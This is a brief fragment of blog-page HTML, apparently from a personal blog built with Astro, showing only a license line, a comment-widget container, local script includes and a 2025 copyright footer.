+</a> <span> 协议进行许可</span> </div> </div> </div> <div id="waline" data-astro-cid-cjuph4ok></div> <script type="module" src="/_astro/Comment.astro_astro_type_script_index_0_lang.BRmPG2zJ.js"></script>  </div>  </div> <script type="module" src="/_astro/Fancybox.astro_astro_type_script_index_0_lang.DeGMrsLV.js"></script> </article> </main> <footer class="py-8 px-4 pb-12 text-center text-[rgb(var(--gray))] bg-gradient-to-b from-transparent to-[rgb(var(--gray-gradient))]">
+&copy; 2025 iami233. All rights reserved.
+</footer> <script type="module" src="/_astro/BlogPost.astro_astro_type_script_index_1_lang.znP5JH7M.js"></script></body></html>
